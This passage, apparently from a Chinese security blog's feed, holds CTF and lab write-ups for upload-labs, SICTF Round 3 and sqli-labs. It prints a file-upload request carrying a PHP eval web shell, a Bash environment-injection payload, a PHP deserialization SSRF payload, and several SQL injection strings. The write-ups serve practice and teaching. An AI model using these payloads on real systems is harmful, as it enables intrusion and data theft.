class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里依然是黑名单绕过, 但是保存的文件名是可控制的</p><p>这里用到一个函数特性:</p><p>move_uploaded_file()会忽略掉文件末尾的 <code>/.</code></p><p>所以构造.php&#x2F;.来绕过黑名单, 经过move_uploaded_file()后又变回了.php</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154404013.png" alt="image-20240223154404013"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154416422.png" alt="image-20240223154416422"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>主要在于这两句:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里只需要传入数组就可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>reset()会返回数组中的第一个值, count()返回数组中的元素个数</p><p>我们只需要使得reset($file)&#x3D;&#x3D;xxx.php; $file[count($file) - 1]&#x3D;&#x3D;空值 就可以构造出一个php文件名</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155819310.png" alt="image-20240223155819310"></p><p>此时数组内有两个元素, 而2-1&#x3D;1 索引为1的元素值为空值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155829766.png" alt="image-20240223155829766"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Upload-labs&quot;&gt;&lt;a href=&quot;#Upload-labs&quot; class=&quot;headerlink&quot; title=&quot;Upload-labs&quot;&gt;&lt;/a&gt;Upload-labs&lt;/h1&gt;&lt;p&gt;网上有21关的和20关两种,在这里以buu upload-labs </summary>
      
    
    
    
    <category term="靶场" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SICTF-Round-3</title>
    <link href="http://example.com/2024/02/19/SICTF-Round-3/"/>
    <id>http://example.com/2024/02/19/SICTF-Round-3/</id>
    <published>2024-02-19T04:30:42.000Z</published>
    <updated>2024-02-19T04:34:50.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h2><p>首先构造后缀名.php.</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.life:36177</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------291815788614695660121094840087</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://yuanshen.life:36177</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://yuanshen.life:36177/index.php?file=index.php</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upfile&quot;; filename=&quot;3.php.&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;?= @eval($_POST[<span class="string">&#x27;nacl&#x27;</span>]);?&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087--</span></span></span><br></pre></td></tr></table></figure><p>上传木马后直接用任意文件包含来触发木马</p><p>这里使用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112135730.png" alt="image-20240217112135730"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112200847.png" alt="image-20240217112200847"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:37269/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg;%20&#125;</span><br><span class="line"></span><br><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJ3b3JyaWVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">You don<span class="string">&#x27;t know how to pass parameters?</span></span><br></pre></td></tr></table></figure><p>还可以扫出来一个admin.php,本地访问admin.php可以拿到flag</p><p>所以payload为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38434/</span><br><span class="line">?Harder=O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:26:&quot;http://127.0.0.1/admin.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>fuzz一下会发现禁了information_schema,or,and这些</p><p>首先可以load_file读取源码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;/**/union/**/select/**/load_file(&#x27;/var/www/html/index.php&#x27;)/**/%23</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--flag在flag表里--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$sensitive_keywords</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;handler&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;-~&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--+&quot;</span>, <span class="string">&quot;information&quot;</span>, <span class="string">&quot;xor&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;order&quot;</span>, <span class="string">&quot;floor&quot;</span>,<span class="string">&quot;sys_tables&quot;</span>,<span class="string">&quot;sys_columns&quot;</span>,<span class="string">&quot;sys.schema_table_statistics_with_buffer&quot;</span>,<span class="string">&quot;sys.schema_table_statistics&quot;</span>,<span class="string">&quot;mid&quot;</span>, <span class="string">&quot;ascii&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查参数中是否包含敏感关键词</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$sensitive_keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$username</span>, <span class="variable">$keyword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果参数中包含敏感关键词，弹窗提示用户</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;hacker&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="comment">// 可以选择终止脚本执行或者做其他处理</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from flag where id=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 输出每一行记录的 love 字段值</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;          &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $result-&gt;num_rows;</span></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只输出零时表中的id字段,且flag所在的列名未知</p><p>这里考察了无列名注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=flag&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.20.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 18 Feb 2024 11:14:38 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.3.33</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>249</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">joe好像喜欢alice，但是alice好像不喜欢joe，你要不要查查他们都喜欢谁(?username=joe)或者(?username=alice)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="comment">&lt;!--flag在flag表里--&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>          flag<span class="tag">&lt;<span class="name">br</span>&gt;</span>          2<span class="tag">&lt;<span class="name">br</span>&gt;</span>          SICTF</span><span class="template-variable">&#123;633db818-0209-465a-9d1c-dfbc36a469e3&#125;</span><span class="language-xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>自测一下无列名注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection <span class="built_in">id</span>:    5</span><br><span class="line">Current database: hcj_db</span><br><span class="line"></span><br><span class="line">+----+------------+----------+</span><br><span class="line">| <span class="built_in">id</span> | username   | password |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">|  1 | hcj        | 123456   |</span><br><span class="line">|  2 | nacl       | 123456   |</span><br><span class="line">| 13 | cabbage    | 12345678 |</span><br><span class="line">| 14 | qwert      | qwert    |</span><br><span class="line">| 15 | qwerty     | qwerty   |</span><br><span class="line">| 16 | cabbaget   | 12345678 |</span><br><span class="line">| 17 | cabbagety  | 12345678 |</span><br><span class="line">| 18 | asdf       | asdf     |</span><br><span class="line">| 19 | asdfg      | asdfg    |</span><br><span class="line">| 20 | www        | wwww     |</span><br><span class="line">| 21 | sss        | sss      |</span><br><span class="line">| 22 | cabbagetya | 12345678 |</span><br><span class="line">| 23 | ddd        | ddd      |</span><br><span class="line">| 24 | xxx        | xxx      |</span><br><span class="line">| 25 | fff        | fff      |</span><br><span class="line">| 26 | ffff       | fff      |</span><br><span class="line">| 27 | fffff      | fff      |</span><br><span class="line">| 28 | <span class="built_in">cat</span>        | <span class="built_in">cat</span>      |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">18 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="built_in">id</span> from <span class="built_in">users</span> <span class="built_in">where</span> <span class="built_in">id</span>= 1 union <span class="keyword">select</span> `2` from (<span class="keyword">select</span> 1,2,3 union <span class="keyword">select</span> * from <span class="built_in">users</span>)a;</span><br><span class="line">+------------+</span><br><span class="line">| <span class="built_in">id</span>         |</span><br><span class="line">+------------+</span><br><span class="line">| 1          |</span><br><span class="line">| 2          |</span><br><span class="line">| hcj        |</span><br><span class="line">| nacl       |</span><br><span class="line">| cabbage    |</span><br><span class="line">| qwert      |</span><br><span class="line">| qwerty     |</span><br><span class="line">| cabbaget   |</span><br><span class="line">| cabbagety  |</span><br><span class="line">| asdf       |</span><br><span class="line">| asdfg      |</span><br><span class="line">| www        |</span><br><span class="line">| sss        |</span><br><span class="line">| cabbagetya |</span><br><span class="line">| ddd        |</span><br><span class="line">| xxx        |</span><br><span class="line">| fff        |</span><br><span class="line">| ffff       |</span><br><span class="line">| fffff      |</span><br><span class="line">| <span class="built_in">cat</span>        |</span><br><span class="line">+------------+</span><br><span class="line">20 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;100％-upload&quot;&gt;&lt;a href=&quot;#100％-upload&quot; class=&quot;headerlink&quot; title=&quot;100％_upload&quot;&gt;&lt;/a&gt;100％_upload&lt;/h2&gt;&lt;p&gt;首先构造后缀名.php.&lt;/p&gt;
&lt;p&gt;poc:&lt;/p&gt;
&lt;figu</summary>
      
    
    
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="SSRF" scheme="http://example.com/tags/SSRF/"/>
    
    <category term="php环境变量注入" scheme="http://example.com/tags/php%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sql无列名注入" scheme="http://example.com/tags/sql%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="http://example.com/2024/02/18/sqli-labs/"/>
    <id>http://example.com/2024/02/18/sqli-labs/</id>
    <published>2024-02-18T05:00:58.000Z</published>
    <updated>2024-02-19T12:19:56.854Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:emails,referers,uagents,users</p><p>Your Password:3</p><p>普通的字符型联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password</p><p>Your Password:3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(id,username,password),3 from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>和Less-1 几乎相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql-labs/Less-1/</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(id,username,password) from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>输入: ?id&#x3D;1’</p><p>……..for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 </p><p>关键在: <code>&#39;  &#39;1&#39;&#39;) LIMIT 0,1 &#39;</code></p><p>系统给输入的内容增加了一个<code>&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,database()%23</span><br></pre></td></tr></table></figure><p>其余步骤与前几关相同</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>输入单引号并不报错,而输入双引号会报错</p><p>与Less-3 类似,只不过使用了<code>&quot;)</code>包裹字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>没有回显username,报错注入秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>看网上还有用group by 双查询注入的</p><p>关于双查询注入:</p><p><a 